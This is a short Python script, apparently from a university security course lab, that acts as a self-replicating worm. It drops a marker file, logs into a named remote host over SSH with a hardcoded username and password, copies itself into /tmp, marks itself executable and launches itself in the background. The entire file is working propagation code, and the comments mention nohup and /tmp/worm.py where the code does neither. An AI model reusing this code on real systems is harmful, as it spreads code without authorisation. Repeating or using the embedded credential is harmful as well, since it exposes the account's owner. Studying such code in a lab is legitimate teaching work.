import paramiko
import sys

# Open the file and write something to it.
# We will use this as evidence that the worm
# has executed on the remote system
fileObj = open("/tmp/file.txt", "w")

# Write something to the file
fileObj.write("It's getting worm...")

# Close the file
fileObj.close()

# Create an instance of the SSH client
ssh = paramiko.SSHClient()

# Set some parameters to make things easier.
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Connect to the remote system.
ssh.connect("node25.ecs.fullerton.edu", username="cpsc456",password="OicdojWuf;")

# Create an instance of the SFTP class; used
# for uploading/downloading files and executing
# commands.
sftpClient = ssh.open_sftp()

# Copy your self to the remote system (i.e. the other VM). We are assuming the
# password has already been cracked. The worm is placed in the /tmp
# directory on the remote system.
sftpClient.put("replicator_worm.py", "/tmp/" + "replicator_worm.py")

# Make the worm file exeutable on the remote system
ssh.exec_command("chmod a+x /tmp/replicator_worm.py")

# Execute the worm!
# nohup - keep the worm running after we disconnect.
# python - the python interpreter
# /tmp/worm.py - the worm script
# & - run the whole commnad in the background
ssh.exec_command("python /tmp/replicator_worm.py &")
